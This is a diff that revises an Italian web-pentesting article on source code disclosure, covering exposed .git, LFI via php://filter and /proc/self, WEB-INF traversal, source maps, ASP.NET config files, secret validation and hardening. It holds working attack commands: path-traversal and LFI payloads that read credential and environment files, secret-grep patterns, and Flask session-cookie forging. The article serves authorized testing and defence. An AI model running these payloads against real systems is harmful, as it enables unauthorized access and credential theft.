+### 3. LFI con php\://filter
+
+Se l'app include un file scelto da te, il wrapper `php://filter` restituisce il sorgente in base64 invece di eseguirlo. È la tecnica standard con una [LFI](https://hackita.it/articoli/lfi/):
 
 ```bash
-git-dumper https://target.com/.git/ ./target-source
-cd target-source
+curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config" | base64 -d
+
+# If a filter blocks "base64", rot13 is a drop-in alternative
+curl -s "https://target.com/index.php?page=php://filter/read=string.rot13/resource=config" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 
-### Step 3 → Grep credenziali nel codice attuale (1 minuto)
+Se l'app aggiunge da sola `.php` in coda al parametro, passa `resource=config` e non `config.php`. Una volta letto `config.php` hai le credenziali del database; leggendo il codice del login trovi gli altri file da richiedere.
+
+### 4. Legacy IIS
+
+Sui vecchi IIS un `.asp` richiesto come `login.asp::$DATA` restituiva il sorgente. Oggi è raro, ma lo trovi ancora su sistemi mai aggiornati.
+
+### Quando non conosci il path dell'applicazione
+
+Con una LFI o un arbitrary file read su Linux non serve indovinare dove sta il codice: lo chiede al processo stesso.
 
 ```bash
-cat .env 2>/dev/null
-grep -r "password\|secret\|key\|token" --include="*.php" --include="*.py" --include="*.yml" .
+# How was the app launched? (arguments are NUL separated)
+curl -s "https://target.com/download.php?file=../../../../proc/self/cmdline" | tr '\0' ' '
+
+# Read the app source from the process working directory
+curl -s "https://target.com/download.php?file=../../../../proc/self/cwd/app.py"
+curl -s "https://target.com/download.php?file=../../../../proc/self/cwd/index.php"
+
+# Environment variables often hold DB credentials and secret keys
+curl -s "https://target.com/download.php?file=../../../../proc/self/environ" | tr '\0' '\n'
 ```
 
-### Step 4 → Scan history con trufflehog (2 minuti)
+## Altri Linguaggi e Artefatti di Build
+
+Il codice precompilato non è al sicuro: si decompila. Ma attenzione alla distinzione nel report: una DLL o una `.class` decompilabile espone la logica, non necessariamente il sorgente originale (commenti, nomi di variabili locali e struttura dei file si perdono).
+
+### Java
+
+`/WEB-INF/` contiene `web.xml` e `classes/`. Non dovrebbe essere raggiungibile, ma lo diventa con path traversal o con Tomcat dietro un reverse proxy che normalizza male i path:
 
 ```bash
-trufflehog filesystem --directory=.
-# Trova e verifica automaticamente credenziali in TUTTA la history
+curl -s --path-as-is "https://target.com/..;/WEB-INF/web.xml"
+curl -s -O --path-as-is "https://target.com/..;/WEB-INF/classes/com/app/LoginServlet.class"
+jadx -d out LoginServlet.class
 ```
 
-### Step 5 → Sfrutta le credenziali
+### Python
+
+I file `.pyc` in `__pycache__/` si decompilano con `pycdc`:
 
 ```bash
-# DB
-mysql -h db-prod.internal -u webapp_admin -p'Pr0d_DB_P@ssw0rd!2024' webapp_production
-
-# AWS
-export AWS_ACCESS_KEY_ID="AKIA..."
-export AWS_SECRET_ACCESS_KEY="wJalrX..."
-aws sts get-caller-identity
-aws s3 ls
-
-# GitLab (se trovi un token CI/CD)
-curl -H "PRIVATE-TOKEN: glpat-xxxx" "https://gitlab.company.com/api/v4/projects"
+curl -s -O https://target.com/__pycache__/app.cpython-311.pyc
+pycdc app.cpython-311.pyc
 ```
 
-***
+### JavaScript Source Map
 
-## 🏢 Enterprise Escalation
-
-### .git → Credenziali → Cloud Takeover
-
-```
-.git/HEAD esposto → git-dumper → codice sorgente
-→ .env con AWS creds → aws s3 ls → 30 bucket
-→ aws secretsmanager → RDS password → dump DB
-→ CLOUD COMPROMISE
-```
-
-### .git → CI/CD Token → Supply Chain
-
-```
-.git/config → URL GitLab/GitHub privato
-→ trufflehog → GitLab CI token nella history
-→ curl GitLab API → accesso a TUTTI i repository
-→ Pipeline injection → codice malevolo nel deploy
-→ SUPPLY CHAIN ATTACK
-```
-
-### .git → Secret Key → Account Takeover
-
-```
-.git → settings.py → SECRET_KEY Django
-→ Forgia session cookie admin
-→ Accesso admin panel senza password
-→ Gestione completa dell'applicazione
-```
-
-## 🔌 Variante API 2026
+Una build di produzione con source map pubblica restituisce i sorgenti originali del frontend, con commenti, route API e a volte chiavi (utile per le [API moderne](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/)).
 
 ```bash
-# .git di microservizi esposti
-https://api.target.com/.git/HEAD
-https://service.target.com/.git/HEAD
-https://admin.target.com/.git/HEAD
+# The last line of the bundle points to the map
+curl -s https://target.com/static/js/main.js | tail -c 200
+# //# sourceMappingURL=main.js.map
 
-# Ogni microservizio può avere il suo .git esposto
-# Con credenziali specifiche per quel servizio
+# Rebuild the original source tree from the map
+sourcemapper -url https://target.com/static/js/main.js.map -output ./sourcemap-out
+grep -rIn -E "apiKey|secret|token|Authorization|/api/" ./sourcemap-out
 ```
 
-***
+## Source Code Disclosure in ASP.NET Apps
 
-## Caso Studio Concreto
+In ASP.NET va distinto cosa è davvero sorgente, cosa è configurazione e cosa è un assembly compilato. Non ogni file raggiungibile è una vulnerabilità.
 
-**Settore:** E-commerce fashion, 150.000 clienti, infrastruttura AWS.
-**Scope:** Black-box.
+Per ASP.NET Core su IIS, la documentazione Microsoft spiega che se `web.config` manca, ha il nome sbagliato o impedisce l'avvio normale del sito, IIS può servire file sensibili della cartella dell'app, in particolare `{ASSEMBLY}.runtimeconfig.json`, `{ASSEMBLY}.deps.json` e `{ASSEMBLY}.xml` (documentazione XML). Con `web.config` presente e sito avviato, quei file non vengono serviti. Microsoft indica di non rimuovere mai `web.config` da un deployment di produzione.
 
-`curl https://target.com/.git/HEAD` → `ref: refs/heads/production`. `git-dumper` ha ricostruito l'intero codice in 3 minuti. Nel codice attuale: `.env` con credenziali MySQL e Stripe live key.
+Primo giro di test, con lo status code e la dimensione di ogni file (l'assembly name lo ricavi da uno stack trace, da `blazor.boot.json` o dal nome della DLL in `/bin/`):
 
-`trufflehog` ha trovato nella history:
-
-* AWS credentials committate 8 mesi prima e "rimosse" → **ancora valide**
-* GitLab CI token nel file `.gitlab-ci.yml` di 6 mesi prima → accesso a tutti i repository del team
-* SSH private key nel commit "add deploy script" di 1 anno prima → accesso SSH a 3 server
-
-Con le AWS creds: `aws s3 ls` → bucket con backup database → 150.000 clienti. Con il token GitLab: accesso a 12 repository privati incluso il codice dell'app mobile e dell'API interna. Con la SSH key: accesso diretto a web server, API server, e worker server.
-
-**Tempo dal `.git/HEAD` alle credenziali AWS:** 8 minuti.
-
-***
-
-## Errori Comuni Reali
-
-**1. Deploy con `git pull` senza rimuovere `.git/`** — Il metodo di deploy più comune e più pericoloso.
-
-**2. "Ho rimosso la password dal codice"** — Ma è ancora nella git history. Servono credential rotation + `git filter-branch` o BFG.
-
-**3. `.gitignore` non include `.env`** — Il file `.env` viene committato insieme al codice.
-
-**4. Dockerfile con `COPY . .`** — Copia `.git/` dentro il container. Se il container serve file statici, `.git/` è esposto.
-
-**5. CI/CD token nei file di configurazione** — `.gitlab-ci.yml`, `.github/workflows/`, `Jenkinsfile` con token hardcoded.
-
-***
-
-## Indicatori di Compromissione (IoC)
-
-* Request verso `/.git/`, `/.svn/`, `/.hg/`, `/.DS_Store` nei log web
-* Download sequenziale di oggetti Git (molte request a `/.git/objects/`)
-* Request verso `/.git/config`, `/.git/HEAD`, `/.git/index`
-* Dopo la disclosure: login con credenziali trovate nel codice, uso di API key, accesso SSH
-
-***
-
-## ✅ Checklist Finale — Source Code Disclosure
-
-```
-DISCOVERY
-☐ /.git/HEAD testato
-☐ /.git/config testato
-☐ /.svn/entries testato
-☐ /.svn/wc.db testato
-☐ /.DS_Store testato
-☐ /.hg/ testato
-☐ PHP source disclosure testato (<?php visibile?)
-☐ feroxbuster/nuclei per file esposti
-
-EXPLOITATION (.git)
-☐ git-dumper eseguito → repository ricostruito
-☐ .env / config analizzati → credenziali estratte
-☐ grep per password/secret/key nel codice
-☐ trufflehog sulla history → segreti committati e rimossi
-☐ git log -p -S "password" → diff con credenziali
-☐ git log -p -S "AKIA" → AWS key nella history
-
-CREDENZIALI TROVATE
-☐ Database credentials testate
-☐ AWS/Azure/GCP credentials testate (sts get-caller-identity)
-☐ Stripe/SendGrid/Twilio API key testate
-☐ CI/CD token testati (GitLab/GitHub API)
-☐ SSH key testate
-☐ Secret key testata (Django/Flask → forgia session cookie)
-
-ESCALATION
-☐ Database dump eseguito
-☐ Cloud enumeration eseguita
-☐ CI/CD access verificato → supply chain risk documentato
-☐ SSH pivot → lateral movement
+```bash
+for f in web.config Web.Debug.config Web.Release.config appsettings.json appsettings.Production.json \
+         elmah.axd trace.axd Application.deps.json Application.runtimeconfig.json Application.xml \
+         bin/Application.dll Application.pdb; do
+  curl -s -o /dev/null -w "%{http_code} %{size_download} /$f\n" "https://target.com/$f"
+done
 ```
 
-***
+| File                                              | Test (autorizzato)           | Evidenza attesa                                         | Rischio e fix                                                                                                                                                                      |
+| ------------------------------------------------- | ---------------------------- | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `web.config`                                      | `curl` sul path              | Su IIS normale 404 (file nascosto). 200 con XML è grave | Connection string e `machineKey`. Un `machineKey` leggibile permette di forgiare ViewState (ysoserial.net). Fix: mai rimuovere o rinominare `web.config`, request filtering attivo |
+| `Web.Debug.config`, `Web.Release.config`          | `curl` sul path              | 200 con XML di trasformazione                           | Spesso contengono le connection string di produzione. Fix: non pubblicarli                                                                                                         |
+| `appsettings.json`, `appsettings.Production.json` | `curl` sul path              | 200 con JSON e `ConnectionStrings`                      | Raggiungibile solo se il file finisce in `wwwroot` o in una cartella servita come statica. Fix: segreti in variabili d'ambiente o secret manager                                   |
+| `*.runtimeconfig.json`, `*.deps.json`, `*.xml`    | `curl` sul path              | 200 con JSON/XML                                        | Versioni runtime, dipendenze (CVE note) e nomi di metodi. Rischio basso da soli. Fix: `web.config` presente                                                                        |
+| `bin/*.dll`                                       | `curl -O`                    | 200 con binario `MZ` (di default IIS blocca `/bin/`)    | Assembly decompilabile con `ilspycmd`: logica e costanti, non sorgente originale. Fix: request filtering, correggere il traversal                                                  |
+| `*.pdb`                                           | `curl -O`                    | 200 con file di debug                                   | Path di build e nomi dei file sorgente; il codice solo se incorporato (embedded source). Fix: non pubblicare i simboli                                                             |
+| `Properties/PublishProfiles/*.pubxml`             | `curl` sul path              | 200 con XML                                             | Dati di Web Deploy e a volte credenziali di pubblicazione. Fix: non pubblicare la cartella                                                                                         |
+| `elmah.axd`, `trace.axd`                          | `curl` sul path              | 200 con log o trace                                     | Stack trace, URL, a volte cookie e sessioni: rischio alto. Fix: disattivare o proteggere con autenticazione                                                                        |
+| Blazor WebAssembly `_framework/*.dll`             | `curl` su `blazor.boot.json` | Elenco di DLL pubbliche                                 | Pubbliche **per design**: non è una vulnerabilità. Cerca segreti hardcoded dentro le DLL                                                                                           |
 
-## Detection & Hardening
+Dopo aver scaricato un assembly:
 
-* **Non deployare con `git pull`** — usa CI/CD che copia solo i file necessari, senza `.git/`
-* **Blocca `.git/` nel web server:**
+```bash
+ilspycmd Application.dll -o ./decompiled
+
+# Strings in .NET assemblies are UTF-16: look for hardcoded secrets
+strings -e l Application.dll | grep -iE 'password|secret|connectionstring|apikey|bearer'
+```
+
+## Information Disclosure Correlata
+
+La source code disclosure è il caso estremo. Intorno ci sono tante **web application information disclosure** e **web server information disclosure** che da sole non danno il codice ma ti portano ai file giusti.
+
+| File o endpoint                                     | Cosa rivela e come lo sfrutti                                                                                                                               |
+| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `phpinfo.php`, `info.php`                           | Versione PHP, `document_root`, `disable_functions`, `open_basedir`, variabili d'ambiente, `upload_tmp_dir`: serve per costruire una catena LFI verso RCE    |
+| `/server-status` (Apache)                           | Richieste in corso, URL interni, IP dei client                                                                                                              |
+| `/actuator/env`, `/actuator/heapdump` (Spring Boot) | Variabili d'ambiente e memoria dell'app con segreti                                                                                                         |
+| Debug Django (`DEBUG=True`)                         | La pagina 404 elenca tutti gli URL pattern; gli errori mostrano righe di codice e settings                                                                  |
+| Laravel con debug attivo (Ignition)                 | Stack trace con sorgente; su versioni vecchie vulnerabili esiste anche RCE (CVE-2021-3129)                                                                  |
+| Console Werkzeug/Flask (`/console`)                 | Con una LFI ricavi il PIN leggendo `/etc/machine-id`, il MAC (`/sys/class/net/eth0/address`) e il path dell'app: da lettura file a RCE                      |
+| `composer.lock`, `package.json`, `requirements.txt` | Versioni esatte delle dipendenze, quindi CVE note                                                                                                           |
+| `.env`, `docker-compose.yml`, `.gitlab-ci.yml`      | Segreti e topologia dell'infrastruttura                                                                                                                     |
+| `.vscode/sftp.json`, `.idea/workspace.xml`          | Credenziali SFTP e path di progetto lasciati dall'IDE                                                                                                       |
+| `robots.txt`, `sitemap.xml`                         | Non è un controllo di accesso e non è una vulnerabilità: elenca path che l'azienda non vuole indicizzare, quindi un ottimo punto di partenza per il fuzzing |
+| Header `Server`, `X-Powered-By`                     | Stack e versioni                                                                                                                                            |
+
+```bash
+# Banner and technology headers
+curl -sI https://target.com | grep -iE '^(server|x-powered-by|x-aspnet-version|x-generator):'
+
+# Verbose errors: force a type error and read the stack trace
+curl -s "https://target.com/index.php?id[]=1" | head -30
+
+# Spring Boot heap dump: secrets are stored as plain strings in memory
+curl -s -O https://target.com/actuator/heapdump
+strings heapdump | grep -iE 'password=|secret|jdbc:|Authorization' | head
+```
+
+I messaggi d'errore verbosi vanno raccolti con Burp: in Repeater cambi tipo e lunghezza dei parametri e leggi cosa restituisce l'app.
+
+## Dal Sorgente alla Vulnerabilità
+
+Hai il codice. Il passo successivo è trasformarlo in finding. Parti dai sink pericolosi, dalle route e dai punti di autenticazione.
+
+```bash
+# PHP: dangerous sinks
+grep -rIn -E '\b(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|unserialize)\s*\(' --include='*.php' .
+grep -rIn -E '\b(include|require)(_once)?\s*[\(\$]' --include='*.php' . | grep -E '\$_(GET|POST|REQUEST|COOKIE)'
+
+# User input flowing into SQL
+grep -rIn -E '\$_(GET|POST|REQUEST|COOKIE)\[' --include='*.php' . | grep -iE 'select|insert|update|delete|query'
+
+# Python / Flask and Node: command execution, unsafe deserialization, template injection
+grep -rIn -E 'subprocess|os\.system|eval\(|pickle\.loads|yaml\.load\(|render_template_string' --include='*.py' .
+grep -rIn -E 'child_process|eval\(|new Function|vm\.run' --include='*.js' . --exclude-dir=node_modules
+
+# Hidden routes and admin endpoints nobody linked
+grep -rIn -E "@app\.route|app\.(get|post|put|delete)\(|Route::(get|post)" .
+
+# Quick static analysis pass
+semgrep --config p/owasp-top-ten --metrics=off .
+```
+
+Poi la catena dipende da cosa trovi:
+
+| Nel codice trovi                                  | Prossimo passo                                                                                                                                                       |
+| ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Query concatenate con input utente                | [SQL Injection](https://hackita.it/articoli/sql-injection/) mirata, poi [sqlmap](https://hackita.it/articoli/sqlmap/) sul parametro esatto                           |
+| `exec`, `system`, `shell_exec` con input          | [Command injection](https://hackita.it/articoli/command-injection/)                                                                                                  |
+| Filtri di upload deboli                           | [File upload attack](https://hackita.it/articoli/file-upload-attack/) con bypass costruito sul filtro reale, poi [web shell](https://hackita.it/articoli/web-shell/) |
+| `unserialize()` su dati controllabili             | Deserializzazione: con le classi dell'app cerchi una gadget chain (phpggc per PHP)                                                                                   |
+| Controlli di autorizzazione mancanti su una route | [IDOR](https://hackita.it/articoli/idor/) e [privilege escalation](https://hackita.it/articoli/privilege-escalation-web/)                                            |
+| Secret JWT o chiave di sessione                   | Token e cookie forgiati ([JWT](https://hackita.it/articoli/jwt/))                                                                                                    |
+| Richieste HTTP verso URL dell'utente              | [SSRF](https://hackita.it/articoli/ssrf/)                                                                                                                            |
+| Template renderizzati da stringa                  | [SSTI](https://hackita.it/articoli/ssti-server-side-template-injection/)                                                                                             |
+
+## Segreti Trovati: Validare Senza Esagerare
+
+Trovare un segreto non vuol dire che sia valido, né che abbia privilegi utili. Nel report distingui tre livelli: **presenza** (il segreto è nel repo), **validità** (autentica ancora) e **impatto** (cosa permette). Per il secondo livello usa la chiamata meno invasiva possibile, sempre dentro lo scope.
+
+```bash
+# AWS: identity of the key, read-only, changes nothing
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
+  aws sts get-caller-identity
+
+# GitLab personal/CI token: who owns it
+curl -s -H "PRIVATE-TOKEN: glpat-8fK2xQ7mZ1pL9vNc4RtB" https://gitlab.company.com/api/v4/user
+
+# GitHub token
+curl -s -H "Authorization: Bearer ghp_R2D2C3PO4zQ8mK1vXb7LwN5sTf9YhJ3uAe6G" https://api.github.com/user
+
+# Slack bot token
+curl -s -H "Authorization: Bearer xoxb-1234567890-0987654321-AbCdEfGhIjKlMnOpQrStUvWx" https://slack.com/api/auth.test
+
+# Database credentials: connect and read who you are, nothing more
+mysql -h db-prod.internal -u webapp_admin -p'Pr0d_DB_P@ssw0rd!2024' -e 'SELECT CURRENT_USER(), @@version;'
+
+# SSH private key: run a harmless command
+chmod 600 id_rsa
+ssh -i id_rsa -o IdentitiesOnly=yes deploy@web01.target.com id
+```
+
+Per le chiavi di pagamento (Stripe, PayPal) non fare transazioni di prova: basta dimostrare che la chiave è live dal prefisso e da una chiamata di sola lettura, se la policy lo consente. Per l'uso dopo l'accesso vedi [SSH](https://hackita.it/articoli/ssh-pentesting-guide/) e [post-exploitation](https://hackita.it/articoli/post-exploitation/).
+
+### Segreto trovato, impatto
+
+| Segreto              | Impatto                                                                                                                                                                          |
+| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Credenziali DB       | Dump dei dati; se l'utente ha privilegi alti, accesso al server ([MySQL](https://hackita.it/articoli/porta-3306-mysql/), [MSSQL](https://hackita.it/articoli/porta-1433-mssql/)) |
+| Chiavi AWS/GCP/Azure | Enumerazione cloud, bucket, secret manager                                                                                                                                       |
+| Token CI/CD          | Accesso ai repository e alle pipeline: rischio supply chain                                                                                                                      |
+| Chiave SSH privata   | Accesso diretto ai server                                                                                                                                                        |
+| `SECRET_KEY` Flask   | Cookie di sessione forgiato                                                                                                                                                      |
+| `SECRET_KEY` Django  | Cookie firmati forgiati, con backend `signed_cookies` o token di reset                                                                                                           |
+| `APP_KEY` Laravel    | Decifra e forgia cookie; in versioni vulnerabili porta a RCE                                                                                                                     |
+| `machineKey` ASP.NET | ViewState forgiato, in alcuni casi RCE                                                                                                                                           |
+| Secret JWT           | Firmi token arbitrari                                                                                                                                                            |
+
+```bash
+# Forge a Flask session cookie once the SECRET_KEY is known
+pip install flask-unsign
+flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'SuperSecretKey2024'
+```
+
+Per l'uso di cookie rubati o forgiati vedi [Session Hijacking](https://hackita.it/articoli/session-hijacking/) e [Account Takeover](https://hackita.it/articoli/account-takeover/).
+
+## Enterprise Escalation
+
+| Catena       | Passaggi                                                                                                                                      |
+| ------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
+| Cloud        | `.git` esposto → dump → `.env` con chiavi AWS → `aws sts get-caller-identity` → `aws s3 ls` → secret manager → password RDS → dump DB         |
+| Supply chain | `.git/config` con token → trufflehog → token CI/CD nella history → API GitLab → accesso ai repository → possibile manomissione della pipeline |
+| Frontend     | Source map JS → route e chiave API interna → API non autenticata → dump utenti → endpoint admin                                               |
+| ASP.NET      | `Web.Release.config` leggibile → `machineKey` → ViewState forgiato → esecuzione di codice                                                     |
+| White-box    | `.git` esposto → sink SQL nel codice → SQL Injection mirata → credenziali admin                                                               |
+
+## Scenario Tipico
+
+**Contesto (illustrativo):** e-commerce fashion su AWS, test black-box.
+
+`curl https://target.com/.git/HEAD` restituisce `ref: refs/heads/production`. git-dumper ricostruisce il repository in pochi minuti. Nel codice attuale ci sono `.env` con credenziali MySQL e una chiave Stripe live.
+
+trufflehog sulla history trova:
+
+* chiavi AWS committate mesi prima e poi "rimosse", ancora valide;
+* un token CI di GitLab dentro un vecchio `.gitlab-ci.yml`, con accesso ai repository del team;
+* una chiave privata SSH in un commit intitolato "add deploy script", valida su più server.
+
+Con le chiavi AWS un `aws s3 ls` mostra un bucket di backup del database. Con il token GitLab si leggono i repository privati di app mobile e API interna. Con la chiave SSH si entra su web server e worker. Nessuna di queste scoperte richiede una vulnerabilità applicativa: bastava un `.git` rimasto sul server.
+
+## Source Code Disclosure Vulnerability: CVSS e Severità
+
+Non esiste un punteggio CVSS unico per questa classe di vulnerabilità: dipende dallo scenario. Il codice sorgente in sé è riservatezza (confidenzialità); la severità sale in base a ciò che contiene e a ciò che apre.
+
+Cosa valutare nel report:
+
+* **Accessibilità**: serve autenticazione? È raggiungibile da Internet? (Attack Vector, Privileges Required)
+* **Cosa viene esposto**: codice senza segreti, configurazione con credenziali, chiavi cloud.
+* **Impatto sul sistema vulnerabile** (Confidenzialità, Integrità, Disponibilità) e **sui sistemi collegati** se i segreti aprono altri accessi (in CVSS 4.0 le metriche dei sistemi successivi, in CVSS 3.1 lo Scope).
+* **Prova**: dimostra solo ciò che hai verificato. Una credenziale non testata non giustifica un impatto alto.
+
+| Scenario                              | Cosa valutare nel pentest                                          |
+| ------------------------------------- | ------------------------------------------------------------------ |
+| Backup con codice non sensibile       | Riservatezza e informazioni effettivamente esposte                 |
+| Repository `.git` accessibile         | Ampiezza del codice recuperabile e presenza di dati riservati      |
+| Configurazione con credenziali valide | Accessi realmente consentiti e privilegi delle credenziali         |
+| Chiave cloud o token CI/CD            | Impatto sugli altri sistemi raggiungibili e sui permessi assegnati |
+| File sorgente tramite LFI             | Tipi di file leggibili, privilegi richiesti e dati esposti         |
+
+Documenta le metriche scelte e motiva ognuna: il punteggio numerico va calcolato sul caso reale con il calcolatore CVSS, non copiato da un esempio.
+
+## Errori Comuni
+
+**1. Deploy con `git pull` nella document root.** Il metodo più diffuso e più pericoloso.
+
+**2. "Ho tolto la password dal codice".** Resta nella history. Serve rotazione delle credenziali, poi pulizia con `git filter-repo` o BFG.
+
+**3. `.env` non in `.gitignore`.** Viene committato con il resto.
+
+**4. Dockerfile con `COPY . .` senza `.dockerignore`.** Copia `.git/` nell'immagine; se il container serve file statici, finisce esposto.
+
+**5. Token nei file CI.** `.gitlab-ci.yml`, `.github/workflows/`, `Jenkinsfile` con segreti in chiaro.
+
+**6. Source map in produzione.** La build di sviluppo pubblica i sorgenti del frontend.
+
+**7. Backup "temporanei" lasciati sul server.** `config.php.bak`, `www.zip`, `dump.sql`.
+
+**8. Disattivare solo il directory listing.** Non basta: i singoli file restano raggiungibili.
+
+**9. Pubblicare file di trasformazione e di build.** `Web.Release.config`, `.pubxml`, `.pdb`.
+
+## Detection e Indicatori di Compromissione
+
+Cosa cercare nei log:
+
+* richieste a `/.git/`, `/.svn/`, `/.hg/`, `/.DS_Store`;
+* molte richieste sequenziali a `/.git/objects/` da uno stesso IP (è il dump);
+* richieste a `/.git/config`, `/.git/HEAD`, `/.git/index`;
+* dopo il leak: login con credenziali presenti nel codice, uso di chiavi API o accessi SSH anomali.
+
+```bash
+# Who is probing for VCS files? (nginx/Apache combined log format)
+grep -E '"(GET|HEAD) /\.(git|svn|hg|bzr)(/|[ ?"])|"(GET|HEAD) /\.DS_Store' /var/log/nginx/access.log \
+  | awk '{print $1}' | sort | uniq -c | sort -rn | head
+```
+
+## Hardening
+
+**Nginx**
 
 ```nginx
-# Nginx
-location ~ /\.git {
-    deny all;
+# Block every dotfile and dotdirectory except /.well-known/
+location ~ /\.(?!well-known/) {
     return 404;
 }
 ```
 
+**Apache**
+
 ```apache
-# Apache
-<DirectoryMatch "\.git">
+# Hide VCS directories
+RedirectMatch 404 /\.(git|svn|hg|bzr)(/|$)
+
+# Deny backup and editor leftovers
+<FilesMatch "\.(bak|old|orig|save|swp|swo|sql|inc)$|~$">
     Require all denied
-</DirectoryMatch>
+</FilesMatch>
 ```
 
-* **Dopo una disclosure: ruota TUTTE le credenziali** — non basta rimuovere il file. Le credenziali nella history sono compromesse.
-* **Pre-commit hook** — usa `git-secrets` o `pre-commit` con `detect-secrets` per bloccare il commit di credenziali
-* **BFG Repo Cleaner** — per rimuovere credenziali dalla history: `bfg --replace-text passwords.txt repo.git`
-* **Dockerfile**: usa `.dockerignore` per escludere `.git/`
+**PHP**
+
+```ini
+; Do not leak errors or the PHP version
+display_errors = Off
+log_errors = On
+expose_php = Off
+```
+
+**ASP.NET / IIS**: tieni sempre `web.config` nel deployment, non pubblicare `Web.*.config`, `.pubxml` e `.pdb`, disattiva `elmah.axd` e `trace.axd` in produzione, tieni i segreti fuori da `appsettings.json` pubblicato.
+
+Poi, per ogni vettore:
+
+* **`.git`, `.svn`**: non deployare con `git pull`; usa una pipeline che copia solo i file necessari. Verifica: `/.git/HEAD` deve rispondere 404.
+* **Backup e swap**: rimuovili dal server e blocca le estensioni. Verifica con il fuzzing della sezione dedicata.
+* **Handler non attivo**: controlla che l'interprete sia attivo in ogni cartella, uploads compresa. Verifica: nessuna risposta contiene `<?php`.
+* **LFI e file read**: valida il parametro con una whitelist di file; disattiva i wrapper che non servono. Verifica: `php://filter` non restituisce il sorgente.
+* **Source map**: non pubblicarle in produzione, o caricale solo sul tool di error tracking. Verifica: nessun `.map` raggiungibile.
+* **Dopo una disclosure ruota tutte le credenziali**: il segreto nella history è compromesso anche se il file non esiste più.
+* **Pulisci la history** (dopo la rotazione): `git filter-repo --replace-text expressions.txt` oppure `bfg --replace-text passwords.txt repo.git`. `git filter-branch` è deprecato.
+* **Pre-commit hook**: `detect-secrets` o `git-secrets` bloccano i segreti prima del commit.
+* **`.dockerignore`** con `.git`, `.env` e `*.map`.
+* **Scansiona i tuoi domini** con nuclei e ffuf come faresti con un target esterno.
+
+## Checklist Finale
+
+```text
+DISCOVERY
+[ ] /.git/HEAD e /.git/config testati (contenuto, non solo status)
+[ ] /.svn/wc.db, /.hg/requires, /.bzr/README testati
+[ ] /.DS_Store testato
+[ ] Fuzzing backup/swap con estensioni (.bak, .old, .swp, ~)
+[ ] Risposta con <?php visibile (handler non attivo)
+[ ] Script di download e LFI testati (php://filter, /proc/self/cwd)
+[ ] Source map .js.map cercata nei bundle
+[ ] ASP.NET: web.config, Web.*.config, appsettings, pdb, elmah/trace
+[ ] Info disclosure correlata: phpinfo, server-status, actuator, debug
+[ ] Sottodomini e microservizi testati con httpx
+[ ] Dork Google e GitHub
+
+EXPLOITATION
+[ ] Repository ricostruito (git-dumper / GitTools / manuale)
+[ ] Remote URL, branch, stash, autori controllati
+[ ] .env e config del codice attuale analizzati
+[ ] File cancellati recuperati dalla history
+[ ] trufflehog git sulla history
+[ ] Sorgente analizzato: sink, route, controlli di autorizzazione
+
+SEGRETI TROVATI (solo in scope)
+[ ] Presenza, validità e impatto documentati separatamente
+[ ] Validazione con la chiamata meno invasiva
+[ ] Secret di firma (Flask/Django/Laravel/JWT/machineKey) valutati
+
+REPORT
+[ ] Causa tecnica e classificazione (OWASP 2025 / CWE) motivate
+[ ] Severità con metriche CVSS motivate sullo scenario reale
+[ ] Rischio supply chain documentato
+[ ] Raccomandata rotazione completa dei segreti
+```
+
+## Domande Frequenti
+
+### Cos'è la source code disclosure?
+
+È l'esposizione non autorizzata del codice sorgente di un'applicazione: il server lo serve in chiaro, oppure un repository, un backup o un file di build è raggiungibile dall'esterno. Rientra nelle information disclosure e il rischio principale sono le credenziali e la logica applicativa che il codice contiene.
+
+### La source code disclosure è una vulnerabilità?
+
+Sì. La classificazione dipende dalla causa: CWE-540 e CWE-538/548/552 per l'esposizione, OWASP A01:2025 Broken Access Control se i file sono raggiungibili da chi non dovrebbe, A02:2025 Security Misconfiguration se la causa è una configurazione errata (A01 e A05 nel Top 10 2021), WASC-13 Information Leakage.
+
+### Come capisco se un sito ha il `.git` esposto?
+
+Richiedi `/.git/HEAD`: se la risposta inizia con `ref: refs/heads/` il repository è esposto. Un 403 su `/.git/` non basta a escluderlo: prova i singoli file e, se rispondono, usa git-dumper o il recupero manuale.
+
+### Cancellare una password dal codice la rimuove dal repository?
+
+No. Il commit che l'ha aggiunta resta nella storia. Va ruotata la credenziale e poi la history va riscritta con `git filter-repo` o BFG.
+
+### Qual è la differenza tra source code disclosure e information disclosure?
+
+L'information disclosure è la categoria generale (errori, header, versioni, file di configurazione). La source code disclosure è il caso in cui ciò che fuoriesce è il codice sorgente dell'applicazione.
+
+### Come si valuta una source code disclosure con CVSS?
+
+Non esiste un punteggio fisso: si valutano accessibilità, privilegi richiesti, cosa viene esposto e l'impatto sui sistemi collegati, poi si calcolano le metriche sullo scenario reale. Un backup con codice innocuo e un `.git` con chiavi AWS valide hanno severità molto diverse.
+
+### Come verificare la source code disclosure in ASP.NET?
+
+Richiedi `web.config`, `Web.Release.config`, `appsettings.json`, `*.deps.json`, `*.runtimeconfig.json`, `*.pdb` e `elmah.axd`, e controlla status e contenuto. Su IIS normale `web.config` risponde 404; un 200 con XML o un assembly scaricabile da `/bin/` indica un problema. Le DLL di Blazor WebAssembly sono pubbliche per design e non sono una vulnerabilità.
+
+### Come si previene?
+
+Non mettere `.git/` e i file di sviluppo nella document root, blocca i file nascosti nel web server, non lasciare backup e source map in produzione, tieni `web.config` e gli handler dei linguaggi attivi e usa scanner di segreti nella pipeline.
 
 ***
 
-Satellite della [Guida Completa File & Path Attacks](/articoli/file-path-attacks-guida-completa/). Vedi anche: [Backup Exposure](/articoli/backup-exposure/), [Arbitrary File Read](/articoli/arbitrary-file-read/).
-
-> Il tuo `.git/` è esposto? Le credenziali rimosse dal codice sono ancora nella history? [Penetration test applicativo HackIta](/servizi) per trovare ogni disclosure prima degli attaccanti. Dalla git history al cloud takeover: [formazione 1:1](/formazione).
